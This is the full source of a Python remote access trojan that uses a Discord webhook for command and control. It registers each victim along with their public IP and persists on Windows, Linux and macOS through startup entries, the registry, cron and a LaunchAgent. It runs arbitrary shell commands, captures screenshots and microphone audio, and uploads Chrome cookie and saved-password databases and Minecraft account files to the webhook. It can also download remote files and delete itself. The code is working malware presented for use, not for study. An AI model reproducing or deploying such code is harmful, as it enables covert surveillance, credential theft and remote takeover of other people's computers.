
import os
import sys
import subprocess
import platform
import base64
import json
import time
import threading
import requests
from PIL import ImageGrab
import pyaudio
import wave
import shutil
import sqlite3
import psutil
import socket
import tempfile
import getpass

# ---------- CONFIG ----------
WEBHOOK_URL = "https://discord.com/api/webhooks/1531543626050568312/R4COgynNgzfMlHx90GPnlt8ZLywjrem2q3HXluJxuaUrw6A55avKG-qBh_SWpeV7KBEM"  # REPLACE THIS
# ----------------------------

class RAT:
    def __init__(self):
        self.webhook = WEBHOOK_URL
        self.running = True
        self.rat_path = os.path.abspath(sys.argv[0])
        self.rat_name = os.path.basename(self.rat_path)
        self.username = getpass.getuser()
        self.computername = socket.gethostname()
        self.victim_id = f"{self.username}@{self.computername}"
        self.persist()
        self.start_local_killswitch_listener()
        self.send(f"**[NEW VICTIM]** {self.victim_id} | IP: {self.get_public_ip()} | OS: {platform.system()} {platform.release()}")

    def send(self, msg):
        try:
            full_msg = f"[{self.victim_id}] {msg}"
            requests.post(self.webhook, json={"content": full_msg[:2000]}, timeout=2)
        except: pass

    def send_file(self, path):
        try:
            with open(path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()
            for chunk in [b64[i:i+1900] for i in range(0, len(b64), 1900)]:
                self.send("FILE: " + os.path.basename(path) + "\n" + chunk)
        except Exception as e:
            self.send("File send error: " + str(e))

    def get_public_ip(self):
        try:
            return requests.get("https://api.ipify.org", timeout=3).text
        except:
            return "Unknown"

    def persist(self):
        system = platform.system()
        try:
            if system == "Windows":
                src = self.rat_path
                dst = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rat.exe")
                if not os.path.exists(dst):
                    shutil.copy2(src, dst)
                key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
                subprocess.run(f"reg add {key} /v rat /t REG_SZ /d \"{dst}\" /f", shell=True, capture_output=True)
            elif system == "Linux":
                autostart = os.path.expanduser("~/.config/autostart/rat.desktop")
                if not os.path.exists(autostart):
                    os.makedirs(os.path.dirname(autostart), exist_ok=True)
                    with open(autostart, "w") as f:
                        f.write(f"[Desktop Entry]\nType=Application\nExec={self.rat_path}\nHidden=false\nX-GNOME-Autostart-enabled=true\n")
                cron_line = f"@reboot {self.rat_path}"
                with open("/tmp/cronjob", "w") as f:
                    subprocess.run(["crontab", "-l"], stdout=f, stderr=subprocess.DEVNULL)
                with open("/tmp/cronjob", "a") as f:
                    f.write(cron_line + "\n")
                subprocess.run(["crontab", "/tmp/cronjob"])
            elif system == "Darwin":
                plist = os.path.expanduser("~/Library/LaunchAgents/com.rat.plist")
                if not os.path.exists(plist):
                    with open(plist, "w") as f:
                        f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.rat</string>
<key>ProgramArguments</key><array><string>{self.rat_path}</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>""")
                    subprocess.run(["launchctl", "load", plist])
        except Exception as e:
            self.send("Persistence error: " + str(e))

    def remove_persistence(self):
        system = platform.system()
        try:
            if system == "Windows":
                dst = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rat.exe")
                if os.path.exists(dst): os.remove(dst)
                key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
                subprocess.run(f"reg delete {key} /v rat /f", shell=True, capture_output=True)
            elif system == "Linux":
                autostart = os.path.expanduser("~/.config/autostart/rat.desktop")
                if os.path.exists(autostart): os.remove(autostart)
                subprocess.run(["crontab", "-l"], stdout=open("/tmp/cronold", "w"), stderr=subprocess.DEVNULL)
                with open("/tmp/cronold", "r") as f:
                    lines = [l for l in f if "rat" not in l]
                with open("/tmp/cronnew", "w") as f:
                    f.writelines(lines)
                subprocess.run(["crontab", "/tmp/cronnew"])
            elif system == "Darwin":
                plist = os.path.expanduser("~/Library/LaunchAgents/com.rat.plist")
                if os.path.exists(plist):
                    subprocess.run(["launchctl", "unload", plist])
                    os.remove(plist)
            try: os.remove(self.rat_path)
            except: pass
        except: pass

    def self_destruct(self):
        try:
            if platform.system() == "Windows":
                bat = os.path.join(tempfile.gettempdir(), "selfdestruct.bat")
                with open(bat, "w") as f:
                    f.write(f"""@echo off
timeout /t 2 /nobreak >nul
del /f /q "{self.rat_path}"
del /f /q "%~f0"
""")
                subprocess.Popen(["cmd", "/c", bat], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                sh = os.path.join(tempfile.gettempdir(), "selfdestruct.sh")
                with open(sh, "w") as f:
                    f.write(f"""#!/bin/bash
sleep 2
rm -f "{self.rat_path}"
rm -f "$0"
""")
                os.chmod(sh, 0o755)
                subprocess.Popen(["bash", sh], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

    def kill_all_instances(self):
        try:
            current_pid = os.getpid()
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['pid'] == current_pid: continue
                    if any(self.rat_name in arg for arg in proc.info['cmdline'] if arg):
                        proc.terminate()
                except: pass
            time.sleep(1)
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['pid'] == current_pid: continue
                    if any(self.rat_name in arg for arg in proc.info['cmdline'] if arg):
                        proc.kill()
                except: pass
        except: pass

    def local_killswitch(self):
        signal_file = os.path.join(tempfile.gettempdir(), "rat_kill_signal.tmp")
        while self.running:
            try:
                if os.path.exists(signal_file):
                    os.remove(signal_file)
                    self.send(f"Local killswitch triggered on {self.victim_id}. Removing persistence and self-destructing.")
                    self.remove_persistence()
                    self.kill_all_instances()
                    self.self_destruct()
                    self.running = False
                    sys.exit(0)
                time.sleep(2)
            except:
                time.sleep(2)

    def start_local_killswitch_listener(self):
        t = threading.Thread(target=self.local_killswitch, daemon=True)
        t.start()

    def handle_command(self, cmd):
        parts = cmd.split(" ", 1)
        command = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if command == "!ss":
            self.take_screenshot()
        elif command == "!cmd":
            self.exec_cmd(arg)
        elif command == "!specs":
            self.get_specs()
        elif command == "!upload":
            self.upload_file(arg)
        elif command == "!recordmic":
            self.record_mic(10)
        elif command == "!getcookies":
            self.get_cookies()
        elif command == "!getpasswords":
            self.get_passwords()
        elif command == "!download":
            self.download_file(arg)
        elif command == "!mcaccount":
            self.get_mc_account()
        elif command == "!whoami":
            self.send(f"Victim: {self.victim_id} | IP: {self.get_public_ip()}")
        elif command == "disableMRat":
            self.send(f"Remote disableMRat received on {self.victim_id}. Removing persistence and self-destructing.")
            self.remove_persistence()
            self.kill_all_instances()
            self.self_destruct()
            self.running = False
            sys.exit(0)
        else:
            self.send("Unknown command")

    def take_screenshot(self):
        path = "ss_" + str(int(time.time())) + ".png"
        ImageGrab.grab().save(path)
        self.send_file(path)
        os.remove(path)

    def exec_cmd(self, cmd):
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
            self.send(out.decode(errors="ignore")[:1900])
        except Exception as e:
            self.send("Cmd error: " + str(e))

    def get_specs(self):
        info = f"Victim: {self.victim_id}\nOS: {platform.system()} {platform.release()}\nArch: {platform.machine()}\nCPU: {os.cpu_count()} cores\nPython: {sys.version}\nIP: {self.get_public_ip()}"
        self.send(info)

    def upload_file(self, path):
        if os.path.exists(path):
            self.send_file(path)
        else:
            self.send("File not found")

    def record_mic(self, duration=10):
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            frames = [stream.read(1024) for _ in range(int(44100/1024 * duration))]
            stream.stop_stream(); stream.close(); p.terminate()
            path = "mic_" + str(int(time.time())) + ".wav"
            wf = wave.open(path, 'wb')
            wf.setnchannels(1); wf.setsampwidth(p.get_sample_size(pyaudio.paInt16)); wf.setframerate(44100)
            wf.writeframes(b''.join(frames)); wf.close()
            self.send_file(path)
            os.remove(path)
        except Exception as e:
            self.send("Mic error: " + str(e))

    def get_cookies(self):
        paths = [
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies"),
            os.path.expanduser("~/.config/google-chrome/Default/Cookies"),
            os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
        ]
        for p in paths:
            if os.path.exists(p):
                self.send_file(p)
                return
        self.send("No Chrome cookies found")

    def get_passwords(self):
        paths = [
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
            os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")
        ]
        for p in paths:
            if os.path.exists(p):
                self.send_file(p)
                return
        self.send("No Chrome passwords found")

    def download_file(self, url):
        try:
            r = requests.get(url, timeout=30)
            name = url.split("/")[-1] or "downloaded"
            with open(name, "wb") as f:
                f.write(r.content)
            self.send("Downloaded: " + name)
        except Exception as e:
            self.send("Download error: " + str(e))

    def get_mc_account(self):
        paths = [
            os.path.expandvars(r"%APPDATA%\.minecraft\launcher_accounts.json"),
            os.path.expanduser("~/.minecraft/launcher_accounts.json"),
            os.path.expanduser("~/Library/Application Support/minecraft/launcher_accounts.json")
        ]
        for p in paths:
            if os.path.exists(p):
                self.send_file(p)
                return
        self.send("No Minecraft account file found")

    def poll(self):
        while self.running:
            try:
                resp = requests.get(self.webhook + "?wait=true", timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if "content" in data and data["content"].startswith("!"):
                        self.handle_command(data["content"])
            except: pass
            time.sleep(3)

if __name__ == "__main__":
    rat = RAT()
    rat.poll()